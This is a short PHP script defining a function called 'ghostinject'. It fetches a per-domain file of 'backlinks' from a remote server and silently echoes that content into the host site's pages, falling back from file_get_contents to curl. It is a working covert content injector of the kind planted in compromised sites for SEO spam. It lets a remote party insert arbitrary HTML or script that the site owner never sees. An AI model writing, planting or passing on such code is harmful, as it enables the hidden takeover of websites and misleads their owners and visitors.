<?php
function ghostinject($domain) {
    $filename = strtolower(str_replace(['.', 'www'], ['-', ''], $domain)) . '.txt';
    $url = 'https://your-remote-url.com/backlinks/' . $filename;

    $content = false;

    if (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url);
    }

    if ($content === false && function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $content = curl_exec($ch);
        curl_close($ch);
    }

    if ($content !== false) {
        echo $content;
    }
}

// Usage example
ghostinject($_SERVER['HTTP_HOST']);
?>
